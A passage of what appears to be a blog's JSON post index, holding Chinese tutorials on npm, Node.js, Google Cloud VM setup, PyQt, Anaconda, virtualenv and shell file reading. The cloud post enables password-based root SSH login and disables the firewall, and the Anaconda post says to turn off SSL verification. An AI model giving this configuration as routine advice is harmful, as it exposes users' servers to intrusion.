update`命令，都是通过这种方式安装模块的。\n\n\n\n#### 2.4 缓存目录\n\nnpm install或npm update命令，从 registry 下载压缩包之后，都存放在本地的缓存目录。\n\n这个缓存目录，在 Linux 或 Mac 默认是用户主目录下的.npm目录，在 Windows 默认是%AppData%/npm-cache。通过配置命令，可以查看这个目录的具体位置。\n\n```shell\n $ npm config get cache \n /Users/liuwei/.npm\n```\n\n \n\n.npm目录保存着大量文件，清空它的命令如下。 \n\n```shell\n$ rm -rf ~/.npm/ \n或\n$ npm cache clean \n```\n\n\n\n#### 2.5 模块的安装过程\n\n总结一下，Node模块的安装过程是这样的。\n\n1. 发出npm install命令\n2. npm 向 registry 查询模块压缩包的网址\n3. 下载压缩包，存放在~/.npm目录\n4. 解压压缩包到当前项目的node_modules目录\n\n\n\n注意，一个模块安装以后，本地其实保存了两份。一份是~/.npm目录下的压缩包，另一份是node_modules目录下解压后的代码。\n\n但是，运行npm install的时候，只会检查node_modules目录，而不会检查~/.npm目录。也就是说，如果一个模块在～/.npm下有压缩包，但是没有安装在node_modules目录中，npm 依然会从远程仓库下载一次新的压缩包。\n\n\n\n### 3. package.json\n\n管理本地安装 npm 包的最好方式就是创建 package.json 文件。一个 package.json 文件可以有以下几点作用：\n\n+ 作为一个描述文件，描述了你的项目依赖哪些包\n\n+ 允许我们使用 “语义化版本规则”（后面介绍）指明你项目依赖包的版本\n\n+ 让你的构建更好地与其他开发者分享，便于重复使用\n\n  \n\n使用 `npm init` 即可在当前目录创建一个 `package.json` 文件。如果嫌回答这一大堆问题麻烦，可以直接输入` npm init -—yes` 跳过回答问题步骤，直接生成默认值的 package.json 文件：\n\n```json\n{\n  \"name\": \"package\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\n\n\n#### 3.1 package.json 的内容\n\n\n\n##### 3.1.1 `package.json` 文件至少要有两部分内容：\n\n1. “name”\n   - 全部小写，没有空格，可以使用下划线或者横线\n2. “version” \n   - x.x.x 的格式\n   - 符合“语义化版本规则”\n\n\n\n##### 3.1.2 其他内容：\n\n+ description：描述信息，有助于搜索\n+ main: `入口文件`，一般都是 index.js. 当使用require()语法来加载一个模块时，就会看此值\n+ scripts：支持的脚本，默认是一个空的 test\n+ keywords：关键字，有助于在人们使用 npm search 搜索时发现你的项目\n+ author：作者信息\n+ license：默认是 MIT\n+ bugs：当前项目的一些错误信息，如果有的话\n\n\n\n##### 3.1.3 scripts属性\n\n可以指定npm命令缩写。\n\n```\n  \"scripts\": {\n    \"start\": \"node store.js\"\n  },\n```\n\n\n\n执行npm run start仍然可以运行成功，通过scripts属性npm run start等价于node store.js。关于scripts的更具体的使用[请看这里](http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html)。\n\n\n\n#### 3.2 指定依赖的包\n\n我们需要在 `package.json` 文件中指定项目依赖的包，这样别人在拿到这个项目时才可以使用 `npm install` 下载。\n\n包有两种依赖方式：\n\n1. `dependencies`：在生产环境中需要用到的依赖\n2. `devDependencies`：在开发、测试环境中用到的依赖\n\n\n\n举个例子：\n\n```\n{\n    \"name\": \"my-weex-demo\",\n    \"version\": \"1.0.0\",\n    \"description\": \"a weex project\",\n    \"main\": \"index.js\",\n    \"devDependencies\": {\n        \"babel-core\": \"^6.14.0\",\n        \"babel-loader\": \"^6.2.5\",\n        \"babel-preset-es2015\": \"^6.18.0\",\n        \"vue-loader\": \"^10.0.2\",\n        \"eslint\": \"^3.5.0\",\n        \"serve\": \"^1.4.0\",\n        \"webpack\": \"^1.13.2\",\n        \"weex-loader\": \"^0.3.3\",\n        \"weex-builder\": \"^0.2.6\"\n    },\n    \"dependencies\": {\n        \"weex-html5\": \"^0.3.2\",\n        \"weex-components\": \"*\"\n    }\n}\n```\n\n\n\n#### 3.3 semantic versioning（语义化版本规则）\n\n\n\ndependencies 的内容，以 \"weex-html5\": \"^0.3.2\" 为例，我们知道 key 是依赖的包名称，value 是这个包的版本。那版本前面的 ^ 或者版本直接是一个 * 是什么意思呢？这就是 npm 的 “Semantic versioning”，简称”Semver”，中文含义即“语义化版本规则”。\n\n在开发中我们有过这样的经验：有时候依赖的包升级后大改版，之前提供的接口不见了，这对使用者的项目可能造成极大的影响。因此我们在声明对某个包的依赖时需要指明是否允许 update 到新版本，什么情况下允许更新。这就需要先了解 npm 包提供者应该注意的版本号规范。\n\n\n\n如果一个项目打算与别人分享，应该从 1.0.0 版本开始。以后要升级版本应该遵循以下标准：\n\n```\n补丁版本：解决了 Bug 或者一些较小的更改，增加最后一位数字，比如 1.0.1\n小版本：增加了新特性，同时不会影响之前的版本，增加中间一位数字，比如 1.1.0\n大版本：大改版，无法兼容之前的，增加第一位数字，比如 2.0.0\n\n了解了提供者的版本规范后， npm 包使用者就可以针对自己的需要填写依赖包的版本规则。\n```\n\n\n\n作为使用者，我们可以在 package.json 文件中写明我们可以接受这个包的更新程度（假设当前依赖的是 1.0.4 版本）：\n\n如果只打算接受补丁版本的更新（也就是最后一位的改变），就可以这么写： \n\n```\n1.0\n1.0.x\n~1.0.4\n```\n\n如果接受小版本的更新（第二位的改变），就可以这么写： \n\n```\n1\n1.x\n^1.0.4\n```\n\n如果可以接受大版本的更新（自然接受小版本和补丁版本的改变），就可以这么写： \n\n```\n*\nx\n```\n\n\n小结一下：总共三种版本变化类型，接受依赖包哪种类型的更新，就把版本号准确写到前一位。\n\n\n\n\n\n### 4. 其他安装知识\n\n\n\n#### 4.1 安装参数 --save 和 --save -dev\n\n添加依赖时我们可以手动修改 package.json 文件，添加或者修改 dependencies devDependencies 中的内容即可。另一种更酷的方式是用命令行，在使用 npm install 时增加 --save 或者 --save -dev 后缀：\n\n```\nnpm install <package_name> --save 表示将这个包名及对应的版本添加到 package.json的 dependencies\n\nnpm install <package_name> --save-dev 表示将这个包名及对应的版本添加到 package.json的 devDependencies\n```\n\ndependencies：在生产环境中需要用到的依赖\n\ndevDependencies：在开发、测试环境中用到的依赖\n\n\n\n#### 4.2 全局安装 package\n\n如果你想要直接在命令行中使用某个包，比如 jshint ，你可以全局安装它。全局安装比本地安装多了个 -g:\n\n```\nnpm install -g <package-name>\n```\n\n安装后可以使用 npm ls -g --depth=0 查看安装在全局第一层的包。\n\n##### 4.2.1 全局安装的权限问题\n\n在全局安装时可能会遇到 EACCES 权限问题, 可以如下解决：\n\n1.使用 sudo 简单粗暴，但是治标不治本\n\n2.修改 npm 全局默认目录的权限\n\n先获取 npm 全局目录：`npm config get prefix`，一般都是 /usr/local； 然后修改这个目录权限为当前用户：\n\n```shell\nsudo chown -R $(whoami) $(npm config get prefix)/{lib/node_modules,bin,share}\n```\n\n\n\n#### 4.3 package-lock.json\n\n原来package.json文件只能锁定大版本，也就是版本号的第一位，并不能锁定后面的小版本，你每次npm install都是拉取的该大版本下的最新的版本，为了稳定性考虑我们几乎是不敢随意升级依赖包的，这将导致多出来很多工作量，测试/适配等，所以package-lock.json文件出来了，当你每次安装一个依赖的时候就锁定在你安装的这个版本。\n\n那如果我们安装时的包有bug，后面需要更新怎么办？\n\n 在以前可能就是直接改package.json里面的版本，然后再npm install了，但是5版本后就不支持这样做了，因为版本已经锁定在package-lock.json里了，所以我们只能npm install xxx@x.x.x  这样去更新我们的依赖，然后package-lock.json也能随之更新。\n\n\n\n\n\n### 参考资料:\n\nhttp://www.ruanyifeng.com/blog/2016/01/npm-install.html\n\nhttp://www.ruanyifeng.com/blog/2016/10/npm_scripts.html\n\nhttps://blog.csdn.net/u011240877/article/details/76582670","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejs介绍和javascript的区别","url":"%2Fp%2F74d8b7c3.html","content":"\n### 1. nodejs的诞生\n\n话说有个叫Ryan Dahl的歪果仁，他的工作是用C/C++写高性能Web服务。对于高性能，异步IO、事件驱动是基本原则，但是用C/C++写就太痛苦了。于是这位仁兄开始设想用高级语言开发Web服务。他评估了很多种高级语言，发现很多语言虽然同时提供了同步IO和异步IO，但是开发人员一旦用了同步IO，他们就再也懒得写异步IO了，所以，最终，Ryan瞄向了JavaScript。\n\n因为JavaScript是单线程执行，根本不能进行同步IO操作，所以，JavaScript的这一“缺陷”导致了它只能使用异步IO。\n\n选定了开发语言，还要有运行时引擎。这位仁兄曾考虑过自己写一个，不过明智地放弃了，因为V8就是开源的JavaScript引擎。让Google投资去优化V8，咱只负责改造一下拿来用，还不用付钱，这个买卖很划算。\n\n于是在2009年，Ryan正式推出了基于JavaScript语言和V8引擎的开源Web服务器项目，命名为Node.js。虽然名字很土，但是，Node第一次把JavaScript带入到后端服务器开发，加上世界上已经有无数的JavaScript开发人员，所以Node一下子就火了起来。\n\n<!-- more -->\n\n>  在Node上运行的JavaScript相比其他后端开发语言有何优势？\n\n最大的优势是借助JavaScript天生的事件驱动机制加V8高性能引擎，使编写高性能Web服务轻而易举。\n\n其次，JavaScript语言本身是完善的函数式语言，在前端开发时，开发人员往往写得比较随意，让人感觉JavaScript就是个“玩具语言”。但是，在Node环境下，通过模块化的JavaScript代码，加上函数式编程，并且无需考虑浏览器兼容性问题，直接使用最新的ECMAScript 6标准，可以完全满足工程上的需求。\n\n\n\n### 2. nodeJs和javascript的异同\n\n我相信很多入坑Nodejs的人都是前端转过来的，但是局限于公司项目用不到Nodejs，只能自学，有些重要且基础的东西就忽略了。\n\n前端的JavaScript其实是由ECMAScript、DOM、BOM组合而成。JavaScript=ECMAScript+DOM+BOM。\n\n#### 2.1 javascript：\n\n- ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)\n- DOM（一些操作页面元素的方法）\n- BOM（一些操作浏览器的方法）\n\n上面是JavaScript的组成部分，那么Nodejs呢？\n\n#### 2.2 nodejs：\n\n- ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)\n- os(操作系统)\n- file(文件系统)\n- net(网络系统)\n- database(数据库)\n\n分析：很容易看出，前端和后端的js相同点就是，他们的语言基础都是ECMAScript，只是他们所扩展的东西不同，前端需要操作页面元素，于是扩展了DOM，也需要操作浏览器，于是就扩展了BOM。而服务端的js则也是基于ECMAScript扩展出了服务端所需要的一些API，稍微了解后台的童鞋肯定知道，后台语音有操作系统的能力，于是扩展os，需要有操作文件的能力，于是扩展出file文件系统、需要操作网络，于是扩展出net网络系统，需要操作数据，于是要扩展出database的能力。\n\n这么一对比，相信很多小伙伴对nodejs更加了解了，原来前端和服务端的js如此相似，他们的基础是相同的，只是环境不同，导致他们扩展出来的东西不同而已。\n\n\n\n### 3. 总结:\n\n在ecmascript部分node和JS其实是一样的，比如与数据类型的定义、语法结构，内置对象。\n\n例如js中的顶层对象是window对象，但是在node中没有什么window对象，node中的顶层对象是global对象。","tags":["nodejs"],"categories":["nodejs"]},{"title":"谷歌云搭建免费服务器","url":"%2Fp%2Fb7e5827a.html","content":"\n前两年折腾过亚马逊的免费一年aws，后来发现速度很慢就弃用了。俗话说免费的是最贵的，但是google注册之后直接给300刀，货真价实的钱可以用来买服务器，简直不要太好用！\n\n> 观看1080p无压力\n\n<img src=\"谷歌云搭建免费服务器/3.png\" alt=\"1\" style=\"zoom: 67%;\" />\n\n<!-- more -->\n\n### 1. 注册并申请GCP\n\nhttps://console.cloud.google.com,  在注册时填写个人资料的时候需要填写visa信用卡验证,可以用自己的visa卡(会扣除1美刀但是会返回, 个别银行visa卡不支持), 当然也可以去万能的某宝购买一个虚拟的信用卡, 价值在10元-30元左右.\n\n### 2. 创建服务器实例\n\n在GCP控制中心的` Compute Engine` 的 VM 实例里, 点击创建实例. 这里我选用的是Ubuntu 16.04, 机器类型共享vCPU科学上网足矣.\n\n<img src=\"谷歌云搭建免费服务器/1.png\" alt=\"1\" style=\"zoom:33%;\" />\n\n\n\n创建成功后,  可以通过网页上的ssh连接进去。\n\n### 3. 安全组放开, 固定IP\n\n点击VM实例 -> 内部IP -> 下面的链接 进入VPC网络管理\n\n<img src=\"谷歌云搭建免费服务器/2.png\" alt=\"1\" style=\"zoom: 33%;\" />\n\n\n\n\n\n只在vps内关闭防火墙是无效的, 还需要在consle设置防火墙规则. 在`防火墙规则`里创建防火墙规则, 增加要放行的端口。\n\n另外最好固定下外部ip地址，否则重启后ip变了会非常的麻烦。在`外部IP地址`里, 增加固定IP即可。\n\n### 4. 设置第三方ssh登录\n\n通过网页的ssh操作很麻烦, 我们希望直接通过终端直接连接服务器。\n\n```bash\n# 1. 设置密码\nsudo passwd root #给root设置个密码\nsudo ufw disable #禁止防火墙, 然并卵, 还需要去控制中心增加防火墙规则\n\n\n# 2. 修改ssh 配置，ssh-copy-id依赖密码\nsudo vi /etc/ssh/sshd_config \n\nPermitRootLogin yes\t\t\t\t\t# 允许root登录\nPasswordAuthentication yes  # 允许密码登录框\n\nsudo systemctl restart sshd # 重启sshd\n\n\n# 3. 拷贝root的密钥\n\nssh-copy-id -i ~/.ssh/fhyx.pub root@34.96.227.178  # 如果想用私钥ssh，换成自己的ip\n```\n\n\n\n### 5. 安装mosh并开机启动（可选）\n\n安装mosh:\n\n```shell\nsudo apt install mosh\n\n# 安装后直接把ssh换成mosh, 连接后会发现速度快很多.(需要增加防火墙规则允许mosh的端口)\n```\n\n\n\n编写`mosh-server` service文件:\n\n```shell\nsudo vi /etc/systemd/system/mosh-server.service\n\n\n[Unit]\nDescription=Mosh server\nAfter=network.target\n\n[Service]\nEnvironment=\"LC_ALL=en_US.UTF8\"\nExecStart=/usr/bin/mosh-server\nType=forking\n\n[Install]\nWantedBy=default.target\n```\n\n\n\n启动并设置开机启动:\n\n```shell\nsudo systemctl daemon-reload\n\nsudo systemctl enable mosh-server\n\nsudo systemctl start mosh-server\n```\n\n\n\n客户端直接用mosh连接就可以了, 如果报错 `LC_CTYPE=UTF-8` 的问题需要在两台电脑上加上环境变量(.zshrc|.bashrc)\n\n```shell\nexport LC_ALL=en_US.UTF-8 \nexport LANG=en_US.UTF-8 \nexport LANGUAGE=en_US.UTF-8\n```\n","tags":["linux"],"categories":["服务器"]},{"title":"pyqt安装使用打包教程","url":"%2Fp%2Fa0594c46.html","content":"\n\n\n最近准备开发一个GUI程序, 考察了一些能选用的技术,  在windows下有多门语言可以选择(包括易语言哈哈). \n\n但是最初的想法是不仅要快捷开发而且最好跨平台, 跨平台基本没得选了只能用qt了, 但短时间内用c++开发还是没有勇气的, 于是举棋不定选python.\n\n\n\n### 1. 下载 qt designer\n\n因为 Qt Creator实在太大了, 选用Qt Designer.下载链接: https://build-system.fman.io/qt-designer-download\n\n安装成功后, 最好设置`Appearance`里为 `Dockerd Window`, 要不然很别扭\n\n<!-- more -->\n\n![1](pyqt安装使用打包教程/1.png)\n\n\n\n### 2. 下载安装pyqt\n\n```shell\nconda create --name pygui python=3.7   # 强烈建议使用conda, 创建一个新的虚拟环境\nconda activate pygui  # 启用虚拟环境\n\n\nconda install pip  # 安装pip\npip install PyQt5\npip install fbs            \npip install PyInstaller\n```\n\n\n\n### 3. pycharm配置QtDesigner和PyUIC\n\n+ 配置conda\n\n  pycharm 设置 `Project Interpreter` 为 pygui下的python\n\n  ![1](pyqt安装使用打包教程/4.png)\n\n\n\n+ 配置Qt Designer\n\n  Program:  你的Qt Designer的路径\n\n  ![1](pyqt安装使用打包教程/2.png)\n\n\n+ 配置PyUIC\n\n  Program:   你的pyuic5路径\n  Arguments:  `$FileName$ -o $FileNameWithoutExtension$.py`\n  Working directory:  `$FileDir$`\n\n  ![1](pyqt安装使用打包教程/3.png)\n\n\n\n\n### 4. 使用pyqt\n\n+ pyqt教程\n  http://zetcode.com/gui/pyqt5/    \n\n  **应该花至少一个下午的时间先撸一遍这个教程**\n\n\n\n+ qt designer教程\n\n  https://doc-snapshots.qt.io/qt5-5.9/qtdesigner-manual.html\n\n  **应该花至少一个上午的时间先撸一遍这个教程**\n\n  \n\n\n  使用qt designer 设计程序后, 保存为.ui文件.  然后用pycharm的 External tools -> PyUIC 生成 py文件\n\n  在生成的py下面加入这些话, 可以运行\n\n  ```python\n  if __name__ == '__main__':\n      import sys\n      app = QtWidgets.QApplication(sys.argv)\n      MainWindow = QtWidgets.QMainWindow()\n      ui = Ui_MainWindow()\n      ui.setupUi(MainWindow)\n      MainWindow.show()\n      sys.exit(app.exec_())\n  ```\n\n\n\n### 5. 打包安装程序\n\n请参考: \n\n+ https://github.com/mherrmann/fbs\n+ https://github.com/mherrmann/fbs-tutorial\n\n\n\n### 6. pyqt5教程\n\n+ http://zetcode.com/gui/pyqt5/\n\n+ https://zhuanlan.zhihu.com/p/48373518","tags":["pyqt"],"categories":["python"]},{"title":"python包管理器anaconda介绍安装和使用","url":"%2Fp%2F3c2948a5.html","content":"\n\n\n在Python中，安装第三方模块，是通过包管理工具pip完成的。用pip一个一个安装费时费力，还需要考虑兼容性。我们推荐直接使用[anaconda](https://www.anaconda.com/)，这是一个基于Python的数据处理和科学计算平台，它已经内置了许多非常有用的第三方库，我们装上Anaconda，就相当于把数十个第三方模块自动安装好了，非常简单易用。\n\n\n\nanaconda 是一个用于科学计算的Python发行版，支持 Linux, Mac, Windows系统，提供了包管理与环境管理的功能，可以很方便地解决多版本python并存、切换以及各种第三方包安装问题。anaconda 利用工具/命令 conda 来进行 package 和 environment 的管理，并且已经包含了Python和相关的配套工具。\n\n\n\n这里先解释下conda、anaconda这些概念的差别，详细差别见下节。\n\n1. ##### anaconda\n\nanaconda 则是一个打包的集合，里面预装好了 conda、某个版本的python、众多packages、科学计算工具等等，所以也称为Python的一种发行版。其实还有Miniconda，顾名思义，它只包含最基本的内容——python与conda，以及相关的必须依赖项，对于空间要求严格的用户，Miniconda是一种选择。\n\n<!-- more -->\n\n2. ##### conda\n\nconda 可以理解为一个工具，也是一个可执行命令，其核心功能是`包管理`与`环境管理`。 包管理与pip的使用类似，环境管理则允许用户方便地安装不同版本的python并可以快速切换。\n\n\n\n进入下文之前，说明一下conda的设计理念——**conda将几乎所有的工具、第三方包都当做package对待，甚至包括python和conda自身**！因此，conda打破了包管理与环境管理的约束，能非常方便地安装各种版本python、各种package并方便地切换。\n\n\n\n\n\n### 1. anaconda、conda、pip、virtualenv的区别\n\n**1. anaconda**\n\nanaconda是一个包含180+的科学包及其依赖项的发行版本。其包含的科学包包括：conda, numpy, scipy, ipython notebook等。\n\n**2. conda**\n\nconda是包及其依赖项和环境的管理工具。\n\n+ 适用语言：Python, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRAN。\n+ 适用平台：Windows, macOS, Linux\n+ 用途：快速安装、运行和升级包及其依赖项；在计算机中便捷地创建、保存、加载和切换环境。\n\n如果你需要的包要求不同版本的Python，你无需切换到不同的环境，因为conda同样是一个环境管理器。仅需要几条命令，你可以创建一个完全独立的环境来运行不同的Python版本，同时继续在你常规的环境中使用你常用的Python版本。\n\n+ conda为Python项目而创造，但可适用于上述的多种语言。\n+ conda包和环境管理器包含于anaconda的所有版本当中。\n\n**3. pip**\n\n+ pip是用于安装和管理软件包的包管理器。\n+ pip编写语言：Python。\n+ Python中默认安装的版本：\n\nPython 2.7.9及后续版本：默认安装，命令为pip\nPython 3.4及后续版本：默认安装，命令为pip3\n\n\n\n**4. virtualenv**\n\n用于创建一个独立的Python环境的工具。解决问题：\n1. 当一个程序需要使用Python 2.7版本，而另一个程序需要使用Python 3.6版本，如何同时使用这两个程序？\n2. 如果将所有程序都安装在系统下的默认路径，如：/usr/lib/python2.7/site-packages，当不小心升级了本不该升级的程序时，将会对其他的程序造成影响。\n3. 如果想要安装程序并在程序运行时对其库或库的版本进行修改，都会导致程序的中断。\n4. 在共享主机时，无法在全局site-packages目录中安装包。\n\nvirtualenv将会为它自己的安装目录创建一个环境，这并不与其他virtualenv环境共享库；同时也可以选择性地不连接已安装的全局库。\n\n\n\n### 2. pip 与 conda 比较\n\n1. 依赖项检查\n\n   pip：1. 不一定会展示所需其他依赖包。2. 安装包时或许会直接忽略依赖项而安装，仅在结果中提示错误。\n\n   conda：1. 列出所需其他依赖包。2. 安装包时自动安装其依赖项。3. 可以便捷地在包的不同版本中自由切换。\n\n   \n\n2. 环境管理\n\n   pip：维护多个环境难度较大。\n   conda：比较方便地在不同环境之间进行切换，环境管理较为简单。\n\n  \n\n3. 对系统自带Python的影响\n\n   pip：在系统自带的Python包中 更新/回退版本/卸载 将影响其他程序。\n   conda：不会影响系统自带Python。\n\n  \n\n4. 适用语言\n\n   pip：仅适用于Python。\n   conda：适用于Python, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRAN。\n\n\n\n### 3. conda与pip、virtualenv的关系\n\nconda结合了pip和virtualenv的功能。\n\n\n\n### 4. anaconda的安装和使用\n\n\n\n**1. 下载安装anaconda**  \n\n下载链接: https://www.anaconda.com/distribution/#download-section\n\n傻瓜安装后, anaconda会把系统Path中的python指向自己自带的Python，并且Anaconda安装的第三方模块会安装在Anaconda自己的路径下，不影响系统已安装的Python目录。\n\n```shell\nwhich python3\n/Users/liuwei/anaconda3/bin/python3\n```\n\n安装成功后在应用程序里打开 `Anaconda Navigator`，会展示出已经安装好的其他常用应用，如：\n\n![1](python包管理器anaconda介绍安装和使用/1.png)\n\n+ Anaconda Navigtor ：用于管理工具包和环境的图形用户界面，后续涉及的众多管理命令也可以在 Navigator 中手工实现。\n\n+ Jupyter notebook ：基于web的交互式计算环境，可以编辑易于人们阅读的文档，用于展示数据分析的过程。\n\n+ qtconsole ：一个可执行 IPython 的仿终端图形界面程序，相比 Python Shell 界面，qtconsole 可以直接显示代码生成的图形，实现多行代码输入执行，以及内置许多有用的功能和函数。\n\n+ spyder ：一个使用Python语言、跨平台的、科学运算集成开发环境。\n\n\n\n**2. 安装后在终端输入conda 无法识别这个命令:**\n\n```shell\nexport PATH=\"${HOME}/anaconda3/bin:$PATH\"\n```\n\n\n\n**3. 修改conda镜像源:**\n\n如不修改conda的镜像源，99.99%会报http链接失败的错误（网友踩坑经验）。\n\n输入以下两条命令来添加清华源：\n\n```shell\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ \nconda config --set show_channel_urls yes\n```\n\n在家目录下会生成`.condarc`文件, 然后把ssl_verfiy改为false,\n\n```\nssl_verify: true\nchannels:\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n  - defaults\nshow_channel_urls: true\n```\n\n\n\n然后用 conda info 查看当前配置信息，channel URLs 字段内容变为清华即修改成功。\n\n\n\n### 5. anaconda python环境的创建和切换\n\n+ 可以在`anaconda-navigator`创建新的环境\n\n  ![1](python包管理器anaconda介绍安装和使用/2.png)\n\n\n\n 也可以命令行创建:\n\n```shell\nconda create -n py27 python=2.7 或 conda create --name py27 python=2.7\n```\n\n\n\n+ 使用如下命令，查看当前有哪些环境：\n\n```shell\nconda info -e\n\nWARNING: The conda.compat module is deprecated and will be removed in a future release.\n\n# conda environments:\n#\nbase                  *  /Users/liuwei/anaconda3\npy27                     /Users/liuwei/anaconda3/envs/py27\n```\n\n星号表示当前激活的环境。\n\n\n\n+ 激活py27环境：\n\n```shell\nsource activate py27 \n或 \nconda activate py27\n```\n\n\n\n这时候看python, 已经链接到py27了\n\n```shell\nwhich python\n\n/Users/liuwei/anaconda3/envs/py27/bin/python\n```\n\n\n\n+ 退出当前环境\n\n```shell\nconda deactivate \n或 \nsource deactivate\n```\n\n\n\n+ 查看安装了哪些包\n\n```shell\nconda list\n```\n\n 以后可以通过`anaconda-navigator`在指定环境下安装包\n\n![1](python包管理器anaconda介绍安装和使用/4.png)\n\n\n\n### 6. 配置pycharm使用anaconda环境\n\n在`Project Interpreter` 增加 virtualenvs的特定环境下的执行程序\n\n![1](python包管理器anaconda介绍安装和使用/3.png)\n\n\n\n\n\n### 7. 常用命令总结\n\n```bash\nconda info -e  # 查看有哪些环境\nconda create --name py27 python=2.7 # 创建一个环境\nconda env remove --name py37 # 删除一个环境\nconda activate py27 # 激活某个环境\nconda deactivate  #退出当前环境\nconda list # 查看安装了哪些包\n\n# conda 里集成 pip, 以防 conda 没有的包, 通过 pip 来安装\nconda install pip\n\nwhich pip\n/Users/liuwei/anaconda3/bin/pip\n\npip install xxx\n```\n\n","tags":["anaconda"],"categories":["python"]},{"title":"python隔离环境virtualenv和virtualenvwrapper的使用","url":"%2Fp%2F8731aeb9.html","content":"\n\n\n如果我们要同时开发多个应用程序，那这些应用程序都会共用一个Python，就是安装在系统的Python 3。如果应用A需要jinja 2.7，而应用B需要jinja 2.6怎么办？\n\n这种情况下，每个应用可能需要各自拥有一套“独立”的Python运行环境。virtualenv就是用来为一个应用创建一套“隔离”的Python运行环境。\n\n\n\n### 1. 安装使用virtualenv(推荐使用virtualenvwrapper)\n\n首先，我们用pip安装virtualenv：\n\n```shell\nsudo pip3 install virtualenv\n```\n\n然后，假定我们要开发一个新的项目，需要一套独立的Python运行环境，可以这么做：\n\n\n\n<!-- more -->\n\n+ 第一步，创建目录：\n\n```shell\nmkdir myproject\ncd myproject/\n```\n\n\n\n+ 第二步，创建一个独立的Python运行环境，命名为venv：\n\n```shell\nvirtualenv --no-site-packages venv\n\nvirtualenv -p /Library/Frameworks/Python.framework/Versions/3.7/bin/python3 --no-site-packages venv  # 指定特定的版本创建隔离环境\n```\n\n\n\n命令virtualenv就可以创建一个独立的Python运行环境，我们还加上了参数--no-site-packages，这样，已经安装到系统Python环境中的所有第三方包都不会复制过来，这样，我们就得到了一个不带任何第三方包的“干净”的Python运行环境。\n\n\n\n+ 第三步, 新建的Python环境被放到当前目录下的venv目录。有了venv这个Python环境，可以用source进入该环境：\n\n```shell\nsource venv/bin/activate\n或\n. venv/bin/activate\n```\n\n注意到命令提示符变了，有个(venv)前缀，表示当前环境是一个名为venv的Python环境。 \n\n（mac iterm2+zsh下会出现蟒蛇哦, 即python的logo）\n\n\n\n在venv环境下，用pip安装的包都被安装到venv这个环境下，系统Python环境不受任何影响。也就是说，venv环境是专门针对myproject这个应用创建的。\n\n\n\n+ 第四步, 退出当前的venv环境，使用deactivate命令：\n\n```shell\ndeactivate\n```\n\n此时就回到了正常的环境，现在pip或python均是在系统Python环境下执行。\n\n完全可以针对每个应用创建独立的Python运行环境，这样就可以对每个应用的Python环境进行隔离。\n\n\n\nvirtualenv是如何创建“独立”的Python运行环境的呢？原理很简单，就是把系统Python复制一份到virtualenv的环境，用命令`source venv/bin/activate`进入一个virtualenv环境时，virtualenv会修改相关环境变量，让命令python和pip均指向当前的virtualenv环境。\n\nvirtualenv为应用提供了隔离的Python运行环境，解决了不同应用间多版本的冲突问题。\n\n\n\n\n\n### 2. 安装virtualenvwrapper\n\nvirtualenv需要每次使用source命令导入虚拟机运行环境，这一点非常麻烦，另外开发者还有可能忘记虚拟环境目录的建立位置，virtualenvwrapper这一命令行工具就是通过对virtualenv进行封装，解决了上述问题\n\n\n\n首先是安装:\n\n```shell\nsudo pip3 isntall virtualenvwrapper\n```\n\n\n\n安装后查找virtualenvwrapper.sh:\n\n```shell\nwhich virtualenvwrapper.sh \n\n/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh\n```\n\n\n\n然后修改环境变量配置 `.zshrc`:\n\n```shell\nexport WORKON_HOME=$HOME/virtualenvs \n\nexport VIRTUALENVWRAPPER_SCRIPT=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n\nexport VIRTUALENVWRAPPER_PYTHON=/Library/Frameworks/Python.framework/Versions/3.7/bin/python3 \n\nexport VIRTUALENVWRAPPER_VIRTUALENV=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenv \n\nexport VIRTUALENVWRAPPER_VIRTUALENV_ARGS='--no-site-packages' \n\nsource /Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n```\n\n\n\n中间的4行和你本机的python版本和路径要保持一致，此处注意如果不加上面中间4行，则会出现下面的错误：\n\n```shell\n/usr/bin/python: No module named virtualenvwrapper\n```\n\n至此大功告成，可以方便的使用virtualenvwrapper了。\n\n\n\n\n\n### 3. 使用virtualenvwrapper\n\n\n\n创建虚拟环境:\n\n```shell\nmkvirtualenv newenv  \n```\n\n\n\n这样就建立了一个虚拟的运行环境，而且一开始就处于激活状态，但看不到newenv目录，其实virtualenvwrapper对虚拟机环境作了统一的管理，根据上面配置的环境变量WORK_HOME的路径信息，在其中建立了虚拟运行环境目录.\n\n\n\n其他有用的命令:\n\n- workon: 打印所有的虚拟环境；\n- mkvirtualenv xxx: 创建 xxx 虚拟环境;\n- workon xxx: 使用 xxx 虚拟环境;\n- deactivate: 退出 xxx 虚拟环境；\n- rmvirtualenv xxx: 删除 xxx 虚拟环境。\n\n\n\n\n\n### 4. 配置pycharm使用隔离环境\n\n在`Project Interpreter` 增加 virtualenvs的特定环境下的执行程序\n\n![1](python隔离环境virtualenv和virtualenvwrapper的使用/1.png)","tags":["virtualenv"],"categories":["python"]},{"title":"shell读取文件内容遇到的坑","url":"%2Fp%2F67723314.html","content":"\n文件内容如下, 需要把1234读取赋值给shell内部的变量nodeid\n\n```\ncat a.conf\nnodeid 1234\n```\n\n<!-- more -->\n\nshell解析文件如下\n\n```shell\n#!/bin/sh\n\nnodeid=0\n\n\nset_nodeid1(){\n\tcat a.conf | while read line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid2(){\n\tfor line in `cat a.conf`\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid3(){\n\twhile read -r line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t 